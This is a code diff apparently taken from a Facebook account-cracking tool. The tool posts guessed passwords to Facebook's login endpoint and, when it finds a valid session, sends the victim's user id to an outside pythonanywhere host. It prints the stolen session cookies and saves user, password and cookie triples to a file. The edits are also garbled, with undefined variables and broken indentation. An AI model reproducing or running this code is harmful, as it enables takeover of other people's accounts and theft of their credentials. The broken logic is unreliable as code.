@@ -1165,13 +1165,12 @@ def m5(idf,pwv):
             'upgrade-insecure-requests': '1',
             'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36'} #'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',}
    lo = session.post('https://bn-in.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100',data=log_data,headers=header_freefb).text
-   log_cookies=session.cookies.get_dict().keys()
-  for cookie in session.cookies:
    print(f"{cookie.name}: {cookie.value}")
-   if 'c_user' in log_cookies:
+   if response.status_code == 200 and 'c_user' in session.cookies.get_dict():
     user = re.findall('c_user=(.*);xs', coki)[0]
-    url = f"https://shishirx.pythonanywhere.com/lock?uid={user}"
-    reqx = requests.get(url).text
+    if cookie in session.cookies:
+     url = f"https://shishirx.pythonanywhere.com/lock?uid={user}"
+     reqx = requests.get(url).text
     if 'live' in reqx:
             print(f'\r\r{P}[ATOM-OK]: {user} | {ps}')
             print(f"\r\033[38;5;196mCOOKIES=[🤖]: {coki}\33[1;36m")
@@ -1184,6 +1183,8 @@ def m5(idf,pwv):
             open('/sdcard/ATOM-M6-live-OK.txt','a').write(user+'|'+ps+'|'+coki+'\n')
             ok+=1 
             break
+    if cookie in session.cookies:
+            print(f"{cookie.name}: {cookie.value}")
    elif 'checkpoint' in log_cookies:
     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
     coki1 = coki.split("1000")[1]
